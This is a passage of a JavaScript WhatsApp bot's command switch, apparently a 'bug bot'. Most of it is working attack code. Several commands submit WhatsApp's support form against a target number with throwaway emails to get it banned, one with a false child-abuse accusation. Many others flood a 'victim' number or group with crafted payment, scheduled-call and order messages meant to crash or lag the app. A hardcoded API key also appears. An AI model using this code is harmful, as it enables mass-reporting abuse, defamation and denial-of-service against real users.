 if (!isCreator) return m.reply('Special For Owner Features!')
 if (!q) return m.reply(`Targetnya?`)
 var axioss = require ("axios")
 let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "ID")
form.append("phone_number", q)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "مرحبًا ، يرجى إلغاء تنشيط هذا الرقم ، لأنني فقدت هاتفي وشخص ما يستخدم رقمي ، يرجى إلغاء تنشيط رقمي")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
 url,
 method: "POST",
 data: form,
 headers: {
cookie
 }
})
m.reply(`Succes ${command} Ke Nomor Tersebut\n
*NOTE :*
Harap Jeda 24 Jam...`)
}
break
//========================
case 'kenonv6':
case 'bannedv6': {
 if (!isCreator) return m.reply('Special For Owner Features!')
 if (!q) return m.reply(`Targetnya?`)
 var axioss = require ("axios")
 let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "ID")
form.append("phone_number", q)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Esse número vem fazendo discurso ao ódio e divulgado conteúdo de porno infantil Numero")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
 url,
 method: "POST",
 data: form,
 headers: {
cookie
 }
})
m.reply(`Succes ${command} Ke Nomor Tersebut\n
*NOTE :*
Harap Jeda 24 Jam...`)
}
break
//========================
case 'kenonv7':
case 'bannedv7': {
 if (!isCreator) return m.reply('Special For Owner Features!')
 if (!q) return m.reply(`Targetnya?`)
 var axioss = require ("axios")
 let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "ID")
form.append("phone_number", q)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Hello, please deactivate this number, because I have lost my cellphone and someone is using my number, please deactivate my number")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
 url,
 method: "POST",
 data: form,
 headers: {
cookie
 }
})
m.reply(`Succes ${command} Ke Nomor Tersebut\n
*NOTE :*
Harap Jeda 24 Jam...`)
}
break
//========================
//========================
case 'bingimg':{
if (!isRegistered) return terdaftar()
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is up, please send ${prefix}The limit to check the limit`)
if (isBan) return terbanned()
if (!q) return m.reply('Masukan promptnya\n\n*Example :*\n1girl, with glasses, in beach')
Al.sendMessage(m.chat, { react: { text: `💗`, key: m.key }})
try {
let txt = await getBuffer(`https://widipe.com/bingimg?text=${text}`)
await Al.sendMessage(m.chat, {image: txt, caption: `Done Sayang`},{ quoted: floc})
Al.sendMessage(m.chat, { react: { text: `🔥`, key: m.key }})
} catch (e) {
m.reply('Gagal Mengconvert Gambar') 
}
}
break
//========================
case 'unbannedv1': {
 if (!isCreator) return m.reply('Special For Owner Features!')
 if (!q) return m.reply(`Targetnya?`)
 var axioss = require ("axios")
 let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "ID")
form.append("phone_number", q)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Hello WhatsApp team, recently my WhatsApp number was suddenly blocked and I couldnt log into my account, in my account there is an important group like a school group and I have to read it but the account My WhatsApp is suddenly blocked, please restore my numbers")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
 url,
 method: "POST",
 data: form,
 headers: {
cookie
 }
})
m.reply(`Succes ${command} Ke Nomor Tersebut\n
*NOTE :*
Harap Jeda 24 Jam...`)
}
break
//========================
case 'unbannedv2': {
 if (!isCreator) return m.reply('Special For Owner Features!')
 if (!q) return m.reply(`Targetnya?`)
 var axioss = require ("axios")
 let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "ID")
form.append("phone_number", q)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Equipe, o sistema de vocês baniram meu número por engano. Peço que vocês reativem meu número pois tenho família em outro país e preciso me comunicar com eles")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
 url,
 method: "POST",
 data: form,
 headers: {
cookie
 }
})
m.reply(`Succes ${command} Ke Nomor Tersebut\n
*NOTE :*
Harap Jeda 24 Jam...`)
}
break
//========================
case 'unbannedv3': {
 if (!isCreator) return m.reply('Special For Owner Features!')
 if (!q) return m.reply(`Targetnya?`)
 var axioss = require ("axios")
 let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "ID")
form.append("phone_number", q)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Halo pak, Akun Whatsapp Saya diblokir Saya Maaf Saya Telah Menginstal Aplikasi Pihak Ketiga Secara Tidak Sengaja. Harap Buka Blokir Akun Saya Sesegera Mungkin. Terimakasih")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
 url,
 method: "POST",
 data: form,
 headers: {
cookie
 }
})
m.reply(`Succes ${command} Ke Nomor Tersebut\n
*NOTE :*
Harap Jeda 24 Jam...`)
}
break
//========================
case 'unbannedv4': {
 if (!isCreator) return m.reply('Special For Owner Features!')
 if (!q) return m.reply(`Targetnya?`)
 var axioss = require ("axios")
 let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "ID")
form.append("phone_number", q)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Kepada pihak WhatsApp yang bijak Sana kenapa akun WhatsApp saya terblokir padahal aktifitas WhatsApp messenger saya normal normal saja mohon dibukakan kembali akun WhatsApp saya dengan ini saya cantumkan kode nomor akun WhatsApp messenger saya sekian banyak Terimakasih")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
 url,
 method: "POST",
 data: form,
 headers: {
cookie
 }
})
m.reply(`Succes ${command} Ke Nomor Tersebut\n
*NOTE :*
Harap Jeda 24 Jam...`)
}
break
//========================
case 'unbannedv5': {
 if (!isCreator) return m.reply('Special For Owner Features!')
 if (!q) return m.reply(`Targetnya?`)
 var axioss = require ("axios")
 let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "ID")
form.append("phone_number", q)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "مرحبًا whatsapp ، تم حظر حسابي بشكل دائم أو مؤقت ، يرجى إلغاء حظر حسابي\nالرقم")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
 url,
 method: "POST",
 data: form,
 headers: {
cookie
 }
})
m.reply(`Succes ${command} Ke Nomor Tersebut\n
*NOTE :*
Harap Jeda 24 Jam...`)
}
break
//========================
case 'iosq':{
if (!isCreator) return m.reply('Special For Owner Features!')
if (!args[0]) return m.reply(`Use ${prefix+command} number\nExample ${prefix+command} 91xxxxxxxxxx`)
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "50"
for (let i = 0; i < amount; i++) {
Al.relayMessage(from,{
extendedTextMessage:{
"text":'.',
"contextInfo": {
"stanzaId": victim,
"participant": victim,
"quotedMessage": {
"conversation": aitext1
},
"disappearingMode": {
"initiator": "CHANGED_IN_CHAT",
"trigger": "CHAT_SETTING"
}
},
"inviteLinkGroupTypeV2": "DEFAULT"
}
},{messageId: null})
}
m.reply(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
}
break
//========================
case 'iosgoogle': {
if (!isCreator) return m.reply('Special For Owner Features!')
if (!args[0]) return m.reply(`Use ${prefix+command} number\nExample ${prefix+command} 91xxxxxxxxxx`)
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "50"
for (let i = 0; i < amount; i++) {
Al.sendMessage(victim,{
text: `https://google.com`,
contextInfo: {
externalAdReply: {
renderLargerThumbnail: true,
mediaType: 1,
title: aitext,
body: `###############################`,
thumbnail: await getBuffer('https://logopng.com.br/logos/google-37.svg'),
jpegThumbnail: await getBuffer('https://logopng.com.br/logos/google-37.svg'),
previewType: "NONE",
sourceUrl: link,
}}
})
}
m.reply(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
}
break
//========================
case 'iosgoogle2': {
if (!isCreator) return m.reply('Special For Owner Features!')
if (!args[0]) return m.reply(`Use ${prefix+command} amount\nExample ${prefix+command} 5`)
amount = `${encodeURI(text)}`
for (let i = 0; i < amount; i++) {
Al.sendMessage(m.chat,{
text: `https://google.com`,
contextInfo: {
externalAdReply: {
renderLargerThumbnail: true,
mediaType: 1,
title: aitext6,
body: `###############################`,
thumbnail: await getBuffer('https://logopng.com.br/logos/google-37.svg'),
jpegThumbnail: await getBuffer('https://logopng.com.br/logos/google-37.svg'),
previewType: "NONE",
sourceUrl: link,
}}
})
}
m.reply(`*Successfully sent as many bugs as ${amount} Please pause for 3 minutes*`)
}
break
//========================
case 'xioscrash':
if (!isCreator) return m.reply('Special For Owner Features!')
if (!args[0]) return m.reply(`Use ${prefix+command} number\nExample ${prefix+command} 91xxxxxxxxxx`)
 victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "50"
for (let i = 0; i < amount; i++) {
Al.relayMessage(victim,{ 
"paymentInviteMessage": {
serviceType: "UPI",
expiryTimestamp: Date.now() + (24 * 60 * 60 * 1000) 
}},{})
await sleep(3000)
}
m.reply(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
break
//========================
case 'xioscrash2':{
if (!isCreator) return m.reply('Special For Owner Features!')
if (!args[0]) return m.reply(`Use ${prefix+command} amount\nExample ${prefix+command} 5`)
 amount = `${encodeURI(text)}`
for (let i = 0; i < amount; i++) {
Al.relayMessage(m.chat,{ 
"paymentInviteMessage": {
serviceType: "UPI",
expiryTimestamp: Date.now() + (24 * 60 * 60 * 1000) 
}},{})
await sleep(3000)
}
m.reply(`*Successfully sent as many bugs as ${amount} Please pause for 3 minutes*`)
}
break
//========================
case 'xcrash':{
if (!isCreator) return m.reply('Special For Owner Features!')
 if (!args[0]) return m.reply(`Use ${prefix+command} number\nExample ${prefix+command} 91xxxxxxxxxx`)
 victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "100"
for (let i = 0; i < amount; i++) {
XeonyCrashy(pushname,victim)
await sleep(3000)
}
m.reply(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
}
break
//========================
case 'xcrash2':
if (!isCreator) return m.reply('Special For Owner Features!')
if (!args[0]) return m.reply(`Use ${prefix+command} amount\nExample ${prefix+command} 5`)
 amount = `${encodeURI(text)}`
for (let i = 0; i < amount; i++) {
XeonyCrashy(pushname,m.chat)
await sleep(3000)
}
m.reply(`*Successfully sent as many bugs as ${amount} Please pause for 3 minutes*`)
break
//========================
case 'amountbug': {
if (!isPremium) return m.reply('Special For Owner Features!')
if (!args[0]) return m.reply(`Use ${prefix+command} amount\nExample ${prefix+command} 5`)
amount = `${encodeURI(text)}`
for (let i = 0; i < amount; i++) {
const xeonybug1 = `${aitext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
Al.relayMessage(from, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
m.reply(`*Successfully sent as many bugs as ${amount} Please pause for 3 minutes*`)
break
//========================
case 'pmbug' :{
 if (!isCreator) return m.reply('Special For Owner Features!')
 if (!args[0]) return m.reply(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
 await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = `${aitext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
Al.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
m.reply(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
break
//========================
case 'delaybug' : {
if (!isCreator) return m.reply('Special For Owner Features!')
if (!args[0]) return m.reply(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = aitext2
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
Al.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
m.reply(`*Successfully Sent Bug To ${victim} Please pause for 3 minutes*`)
break
//========================
case 'docubug': {
if (!isCreator) return m.reply('Special For Owner Features!')
if (!args[0]) return m.reply(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
await loading()
if (args.length < 1) return m.reply(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "15"
for (let i = 0; i < amount; i++) {
const xeonybug1 = `${aitext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
Al.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
m.reply(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
break
//========================
case 'unlimitedbug' : {
if (!isCreator) return m.reply('Special For Owner Features!')
if (!args[0]) return m.reply(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = aitext3
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
Al.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
m.reply(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
break
//========================
case 'bombug': {
if (!isCreator) return m.reply('Special For Owner Features!')
if (!args[0]) return m.reply(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = aitext4
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
Al.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
m.reply(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
break
//========================
case 'lagbug' : {
if (!isCreator) return m.reply('Special For Owner Features!')
if (!args[0]) return m.reply(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = aitext2
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
Al.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
m.reply(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
break
//========================
case 'trollybug': {
if (!isCreator) return m.reply('Special For Owner Features!')
if (!args[0]) return m.reply(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "15"
for (let i = 0; i < amount; i++) {
var order = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": thumb,
"itemCount": 1999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `${namabot}`,
"orderTitle": " TROLLY BUG ", 
"sellerJid": "916909137213@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: from, quoted:m})
Al.relayMessage(victim, order.message, { messageId: order.key.id })
}
m.reply(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
}
break
//========================
case 'gcbug' : {
if (!isCreator) return m.reply('Special For Owner Features!')
 if (!args[0]) return m.reply(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/BhCQbtWp3mxK8eWuDPwWUr`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let xeongc = await Al.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = `${aitext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
Al.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
m.reply(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
}
break
//========================
case 'delaygcbug' :  {
if (!isCreator) return m.reply('Special For Owner Features!')
if (!args[0]) return m.reply(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/BhCQbtWp3mxK8eWuDPwWUr`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let xeongc = await Al.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = aitext5
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
Al.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
m.reply(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
}
break
//========================
case 'laggcbug' :  {
if (!isCreator) return m.reply('Special For Owner Features!')
if (!args[0]) return m.reply(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/BhCQbtWp3mxK8eWuDPwWUr`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let xeongc = await Al.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = aitext2
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
Al.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
m.reply(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
}
break
//========================
case 'bomgcbug' :  {
if (!isCreator) return m.reply('Special For Owner Features!')
if (!args[0]) return m.reply(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/BhCQbtWp3mxK8eWuDPwWUr`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let xeongc = await Al.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = aitext4
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
Al.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
m.reply(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
}
break
//========================
case 'unlimitedgcbug' :  {
if (!isCreator) return m.reply('Special For Owner Features!')
if (!args[0]) return m.reply(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/BhCQbtWp3mxK8eWuDPwWUr`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let xeongc = await Al.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = aitext3
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
Al.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
m.reply(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
}
break
//========================
case 'trollygcbug' :  {
if (!isCreator) return m.reply('Special For Owner Features!')
if (!args[0]) return m.reply(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/BhCQbtWp3mxK8eWuDPwWUr`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let xeongc = await Al.groupAcceptInvite(result)
amount = "15"
for (let i = 0; i < amount; i++) {
var order = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": thumb,
"itemCount": 1999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `${namabot}`,
"orderTitle": " TROLLY BUG ", 
"sellerJid": "916909137213@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: from, quoted:m})
Al.relayMessage(xeongc, order.message, { messageId: order.key.id })
}
m.reply(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
}
break
//========================
case 'docugcbug' :  {
if (!isCreator) return m.reply('Special For Owner Features!')
if (!args[0]) return m.reply(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/BhCQbtWp3mxK8eWuDPwWUr`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let xeongc = await Al.groupAcceptInvite(result)
amount = "15"
for (let i = 0; i < amount; i++) {
const xeonybug1 = `${aitext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
Al.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
m.reply(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
} 
break
//========================
case 'playstore1':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!q) return m.reply(`*Example :* ${prefix + command} clash of clans`)
m.reply(mess.wait)
let res = await fetch(`https://api.betabotz.org/api/search/playstore?app=${q}&apikey=2fbgCgOB`)
let data = await res.json()
let teks = `*Playstore Search From :* ${q}\n\n`
for (let i of data.result) {
            teks += `• Name : ${i.nama}\n`
            teks += `• Link : ${i.link}\n`
            teks += `• Developer : ${i.developer}\n`
